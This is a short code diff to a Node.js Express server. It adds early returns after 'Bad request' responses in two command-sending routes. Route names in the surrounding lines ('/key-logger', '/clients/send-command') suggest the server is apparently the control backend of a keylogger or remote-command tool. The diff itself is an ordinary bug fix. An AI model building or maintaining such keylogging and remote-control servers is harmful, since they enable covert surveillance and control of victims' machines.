@@ -25,6 +25,7 @@ app.get('/clients', (req, res) => {
 app.post(`/clients/send-command`, (req, res) => {
     if (!req.body.command) {
         res.status(400).send('Bad request')
+        return
     }
 
     const message = {
@@ -59,6 +60,7 @@ app.post('/key-logger', (req, res) => {
 app.post('/send-command', (req, res) => {
     if (!req.body.command) {
         res.status(400).send('Bad request')
+        return
     }
 
     const message = {
